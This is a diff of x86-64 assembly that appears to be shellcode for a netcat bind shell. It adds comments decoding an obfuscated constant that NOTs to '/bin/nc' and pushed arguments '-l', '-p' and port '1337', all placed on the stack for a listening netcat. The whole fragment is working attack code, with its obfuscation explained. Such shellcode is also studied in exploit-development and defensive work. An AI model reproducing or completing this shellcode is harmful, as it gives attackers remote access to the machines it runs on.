@@ -11,7 +11,7 @@ _start:
 	sub eax , eax
 	mov rdx , rax
 	push rdx
-	mov rbx , 0x9c91d0d091969dd0
+	mov rbx , 0x9c91d0d091969dd0     ; "/bin/nc" , "noted"
 	not rbx
 	push rbx
 	push rsp
@@ -34,18 +34,18 @@ _start:
         pop rbx
 
 	push dx
-	push dword 0x37333331
+	push dword 0x37333331 ; "1337"
 	push rsp
         pop r13
 
 	push dx
-	push word 0x702d
+	push word 0x702d                ; "-p"
 	push rsp
         pop r12
 
 
 	push dx
-	push word 0x6c2d
+	push word 0x6c2d              ;  "-l"
 	push rsp
         pop r11
 
